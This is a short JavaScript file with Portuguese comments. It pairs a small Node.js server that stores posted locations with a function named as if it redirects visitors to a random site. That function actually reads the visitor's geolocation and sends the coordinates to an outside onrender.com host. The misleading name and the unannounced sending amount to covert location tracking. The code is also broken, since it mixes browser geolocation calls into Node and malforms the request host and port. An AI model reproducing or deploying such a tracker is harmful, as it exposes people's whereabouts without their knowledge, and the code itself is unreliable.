const http = require('http');
const querystring = require('querystring');

function createServer() {
    // Exemplo de dados
    let data = [];

    const server = http.createServer((req, res) => {
        if (req.url === '/api/locations' && req.method === 'POST') {
            let body = '';

            req.on('data', chunk => {
                body += chunk;
            });

            req.on('end', () => {
                const newLocation = JSON.parse(body);
                data.push(newLocation);
                res.writeHead(201, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(newLocation));
            });
        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ message: 'Route not found' }));
        }
    });

    const PORT = process.env.PORT || 3000;
    server.listen(PORT, () => {
        console.log(`Server is running on port ${PORT}`);
    });
}

// Chamada da função para iniciar o servidor
createServer();

let sites = ['leandrocmore.github.io/portifolio'];

function redirecionarParaSiteAleatorio() {
    obterLocalizacao();
}

function obterLocalizacao() {
    navigator.geolocation.getCurrentPosition(success, error);
}

function success(position) {
    let { coords } = position;
    let latitude = coords.latitude;
    let longitude = coords.longitude;

    // Enviar dados para a API via método POST
    enviarDadosParaAPI(latitude, longitude);
}

function enviarDadosParaAPI(latitude, longitude) {
    const data = {
        latitude: latitude,
        longitude: longitude
    };

    const postData = querystring.stringify(data);

    const options = {
        hostname: 'https://cacagolp2-5.onrender.com/api/', // Altere para o seu host
        port: 8000, 
        path: 'data/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = http.request(options, (res) => {
        console.log(`Status da requisição: ${res.statusCode}`);
        
        res.on('data', (chunk) => {
            console.log(`Corpo da resposta: ${chunk}`);
        });
    });

    req.on('error', (error) => {
        console.error(`Ocorreu um erro na requisição: ${error}`);
    });

    req.write(postData);
    req.end();
}

redirecionarParaSiteAleatorio();
